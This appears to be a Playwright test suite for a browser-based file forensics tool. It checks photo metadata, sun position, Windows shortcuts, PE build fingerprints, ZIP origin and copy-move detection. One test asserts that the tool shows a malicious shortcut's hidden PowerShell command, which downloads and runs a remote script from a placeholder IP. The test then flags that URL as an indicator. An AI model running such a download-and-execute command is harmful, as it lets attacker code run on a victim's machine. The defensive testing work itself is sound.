// Forensics kit, deeper checks: every metadata format in the File inspector, how a JPEG was written, the EXIF thumbnail
// compared with the picture, the sun at the moment and place, Windows shortcuts (machine name, MAC, volume serial),
// Windows program fingerprints checked against pefile (imphash, Rich header hash, PDB path, version info), who packed a
// ZIP and their time zone, the copy-move view (finds a pasted patch, no false alarm on 18 real photos), HEIC without
// pixels, strings by kind and the hex viewer.
const { test, expect } = require('@playwright/test');
const { open, fixture, noErrors } = require('./helpers');
const fs = require('fs');

async function inspect(page, f) {
  await page.evaluate(() => { UI.labTab = 'file'; UI.labFile = null; renderMain(); });
  await page.setInputFiles('#labIn', fixture(f));
  await expect.poll(() => page.evaluate(() => !!(UI.labFile && !UI.labFile.busy && UI.labFile.sha256)), { timeout: 30000 }).toBe(true);
}
async function picture(page, f) {
  await page.evaluate(() => { UI.labTab = 'image'; UI.img = null; renderMain(); });
  await page.setInputFiles('#imgIn', fixture(f));
  await expect.poll(() => page.evaluate(() => !!(UI.img && !UI.img.busy)), { timeout: 30000 }).toBe(true);
}

test('an edited photo: encoder, cropped-thumbnail, Photoshop, time zone and where the sun was', async ({ page }) => {
  const errors = await open(page, '#/lab');
  await inspect(page, 'forensic/edited-crop.jpg');
  const card = page.locator('.fx-pic');
  await expect(card).toContainText('Standard (IJG / libjpeg) at quality 92');
  await expect(card).toContainText('4:2:0');
  await expect(card.locator('.fx-th')).toContainText('crop of what the thumbnail shows');
  // Paris, 11:52 UTC on the solstice: the sun due south and 64.6° high (solar noon), shadows north; the camera faced 170°, into the sun
  await expect(card).toContainText('179.6° (south)'); await expect(card).toContainText('64.6°');
  await expect(card).toContainText('towards the sun');
  const meta = page.locator('.fx-meta');
  await expect(meta).toContainText('Saved by an editing program: Adobe Photoshop 25.0 (Windows)');
  await expect(meta).toContainText('Changed after it was taken');
  await expect(meta).toContainText('48.858369, 2.294481');
  // the same facts go into the case with the file
  const sum = await page.evaluate(() => labSummary(UI.labFile));
  expect(sum).toContain('Embedded thumbnail: The picture is a crop'); expect(sum).toContain('azimuth 179.6°'); expect(sum).toContain('Make: Canon');
  // a library JPEG straight from an app: standard tables, no thumbnail check to make
  await inspect(page, 'forensic/library-q75.jpg');
  await expect(page.locator('.fx-pic')).toContainText('quality 75'); await expect(page.locator('.fx-pic .fx-th')).toHaveCount(0);
  // a night claim: GPS clock 23:30 UTC in Paris in June — the sun is 17° below the horizon
  await inspect(page, 'forensic/night-claim.jpg');
  await expect(page.locator('.fx-pic')).toContainText('below the horizon — night');
  noErrors(errors);
});

test('a malicious shortcut gives up the machine that made it', async ({ page }) => {
  const errors = await open(page, '#/lab');
  await inspect(page, 'forensic/invoice.pdf.lnk');
  const c = page.locator('section.card:has(h3:has-text("Windows shortcut (LNK)"))');
  await expect(c).toContainText('Runs a command, not a document');
  await expect(c).toContainText('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe');
  await expect(c).toContainText('-w hidden -nop -c "iex(iwr http://198.51.100.7/a.ps1)"');
  await expect(c).toContainText('desktop-7f3k2a'); await expect(c).toContainText('00:0c:29:4f:8e:35'); await expect(c).toContainText('1A2B-3C4D');
  await expect(c).toContainText('2025-03-01 18:30:00 UTC');   // when that MAC was recorded (version-1 object ID)
  await expect(c).toContainText('minimised');
  await expect(page.locator('#fxMacV')).toContainText('VMware', { timeout: 10000 });   // the vendor list knows the card
  await expect(page.locator('#fxMacV')).toContainText('virtual machine');
  const iocs = await page.evaluate(() => UI.labFile.iocs.map(e => e.v));
  expect(iocs).toContain('http://198.51.100.7/a.ps1');
  noErrors(errors);
});

test('a Windows program: imphash, Rich header and PDB match pefile; strings by kind; the hex viewer finds and pages', async ({ page }) => {
  const errors = await open(page, '#/lab');
  await inspect(page, 'forensic/launcher-w32.exe');
  const c = page.locator('section.card:has(h3:has-text("Build fingerprints"))');
  // reference values from pefile 2024.8.26: get_imphash(), get_rich_header_hash(), DIRECTORY_ENTRY_DEBUG
  await expect(c).toContainText('af457a899dff0be8f96c758b66fd5f37');
  await expect(c).toContainText('24f28c9802bcb7fe3063fd33a3a0e3e5');
  await expect(c).toContainText('C:\\Users\\Vinay\\Projects\\simple_launcher\\dist\\w32.pdb');
  await expect(c).toContainText('user name is in the build path: Vinay');
  await expect(c).toContainText('Simple Launcher Executable'); await expect(c).toContainText('1.1.0.14');
  await expect(c).toContainText('Not signed');
  expect(await c.locator('a[href*="imphash"]').count()).toBeGreaterThanOrEqual(2);
  // strings by kind
  await page.click('[data-act=fxStrK][data-v=dev]');
  await expect(page.locator('pre.strs')).toContainText('w32.pdb');
  // hex: find the PE header, page on, go to an offset
  await page.fill('#fxHexFind', '50 45 00 00'); await page.click('[data-act=fxHexFind]');
  await expect(page.locator('#fxHexMsg')).toHaveText(/Found at 0x/);
  await expect(page.locator('.fx-hex mark').first()).toHaveText('50');
  await page.click('[data-act=fxHex]:has-text("Next")');
  await expect(page.locator('.fx-hex header .t3')).toHaveText(/^0x4f0 /);
  await page.fill('#fxHexGo', '0x1000'); await page.press('#fxHexGo', 'Enter');
  await expect(page.locator('.fx-hex .hexd .o').first()).toHaveText('00001000');
  noErrors(errors);
});

test('a ZIP tells who packed it and in which time zone; an entry opens on its own', async ({ page }) => {
  const errors = await open(page, '#/lab');
  await inspect(page, 'forensic/packed-tokyo.zip');
  const c = page.locator('section.card:has(h3:has-text("Who packed it"))');
  await expect(c).toContainText('Unix or Linux'); await expect(c).toContainText('UTC+09:00'); await expect(c).toContainText('0:0 (root)');
  await expect(c).toContainText('2025-05-10 05:22 UTC');
  await expect(page.locator('section', { hasText: 'Embedded file signatures' })).toHaveCount(0);   // a zip's own headers are not "embedded files"
  await page.click('[data-act=fxZipOpen][data-v="next.php"]');
  await expect.poll(() => page.evaluate(() => UI.labFile && UI.labFile.name)).toBe('next.php');
  await expect(page.locator('.fi-sum')).toContainText('taken out of packed-tokyo.zip');
  await expect(page.locator('pre.strs')).toContainText('7012345678:AAH');
  noErrors(errors);
});

test('old Word, PDF and HEIC metadata in the File inspector; HEIC in Image tools without pixels', async ({ page }) => {
  const errors = await open(page, '#/lab');
  await inspect(page, 'office/invoice.doc');
  await expect(page.locator('.fx-meta')).toBeVisible();
  const docFacts = await page.evaluate(() => UI.labFile.meta.fields.map(f => f.k));
  expect(docFacts.length).toBeGreaterThan(2);
  await inspect(page, 'meta/iphone11pro.heic');
  await expect(page.locator('.fx-meta')).toContainText('iPhone 11 Pro');
  await picture(page, 'meta/iphone11pro.heic');
  await expect(page.locator('.imgwrap')).toContainText('cannot draw HEIC pictures');
  await expect(page.locator('.fx-meta')).toContainText('iPhone 11 Pro');
  noErrors(errors);   // no attempt to load an undecodable blob
});

test('copy-move finds a pasted patch (lossless, JPEG, resized) and stays quiet on 18 untouched photos', async ({ page }) => {
  test.setTimeout(120000);
  const errors = await open(page, '#/lab');
  await picture(page, 'forensic/copy-move-q90.jpg');
  await page.click('[data-act=imgCh][data-v=clone]');
  await expect(page.locator('#elaNote')).toContainText('1 area copied within the picture', { timeout: 15000 });
  await expect(page.locator('#elaNote')).toContainText('240 px right, 134 px down');
  for (const v of ['noise', 'lev', 'ela']) { await page.click(`[data-act=imgCh][data-v=${v}]`); await expect(page.locator('#imgCv')).toBeVisible(); }
  await page.click('[data-act=imgZoom][data-v="2"]');
  expect(await page.evaluate(() => $('imgCv').style.width)).toBe((480 * 2) + 'px');
  await expect(page.locator('.fx-hist')).toBeVisible();
  const scan = async b => page.evaluate(async a => { const bm = await createImageBitmap(new Blob([new Uint8Array(a)])), c = document.createElement('canvas'); c.width = bm.width; c.height = bm.height; const x = c.getContext('2d'); x.drawImage(bm, 0, 0);
    return fxCloneScan(x.getImageData(0, 0, c.width, c.height)).found.length; }, [...b]);
  expect(await scan(fs.readFileSync(fixture('forensic/copy-move.png')))).toBe(1);
  // the same tampered picture resized to 1000 px wide: the copy lands between pixels and is still found
  const resized = await page.evaluate(async a => { const bm = await createImageBitmap(new Blob([new Uint8Array(a)])), c = document.createElement('canvas'); c.width = 1000; c.height = 1333; c.getContext('2d').drawImage(bm, 0, 0, 1000, 1333);
    return fxCloneScan(c.getContext('2d').getImageData(0, 0, 1000, 1333)).found.length; }, [...fs.readFileSync(fixture('forensic/copy-move.png'))]);
  expect(resized).toBe(1);
  for (let i = 1; i <= 18; i++) expect(await scan(fs.readFileSync(fixture(`pics/p${String(i).padStart(2, '0')}.jpg`))), `p${i}`).toBe(0);
  noErrors(errors);
});

test('file names that say where a picture came from', async ({ page }) => {
  const errors = await open(page, '#/lab');
  const r = await page.evaluate(() => ['IMG-20240105-WA0003.jpg', 'photo_2024-03-01_18-22-05.jpg', 'PXL_20240101_101010123.jpg', 'Screenshot_20240202-101112_Telegram.jpg', '123456789_1234567890123_1234567890123456789_n.jpg', 'vacation.jpg'].map(n => { const h = fxNameHint(n); return h ? h.src + (h.when ? ' ' + h.when : '') : null; }));
  expect(r).toEqual(['WhatsApp 2024-01-05', 'Telegram 2024-03-01 18:22:05', 'Pixel 2024-01-01 10:10:10', 'Screenshot 2024-02-02 10:11:12', 'Meta', null]);
  noErrors(errors);
});
